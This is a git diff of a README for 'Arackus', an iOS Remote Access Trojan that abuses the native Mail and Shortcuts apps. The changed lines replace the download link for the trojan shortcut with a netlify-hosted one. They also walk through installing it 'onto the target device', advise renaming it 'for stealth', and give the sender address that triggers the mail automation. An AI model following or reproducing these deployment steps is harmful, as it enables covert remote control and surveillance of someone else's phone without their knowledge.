@@ -6,13 +6,13 @@ Arackus is an iOS Remote Access Trojan (RAT) using the native mail and shortcut 
 [![logo](https://i.ibb.co/G344QwLD/IMG-3312.jpg)](https://arackus.lovable.app)
 # Adding Arackus Clients
 
-1. Install [this shortcut](https://www.icloud.com/shortcuts/afe0c1c6c0d84eddb19edf41a2bf4a42 "this shortcut") onto the target device.
+1. Install [this shortcut](https://eclectic-capybara-98223e.netlify.app/ "this shortcut") onto the target device.
 	>**Note:** You should probably change the name of the shortcut and/or icon for stealth.
-2. ![settings](https://i.ibb.co/QvrdTKrw/IMG-2273.jpg)
-3. Create a new email in the default mail app (not Gmail or anything else), or note the email that's already there.
-4. Add a new shortcut automation.
-5. Select email
-6. Sender email:
+3. ![settings](https://i.ibb.co/QvrdTKrw/IMG-2273.jpg)
+4. Create a new email in the default mail app (not Gmail or anything else), or note the email that's already there.
+5. Add a new shortcut automation.
+6. Select email
+7. Sender email:
 ```sh
 MS_Qeg5Gb@test-z0vklo66v6el7qrx.mlsender.net
 ```
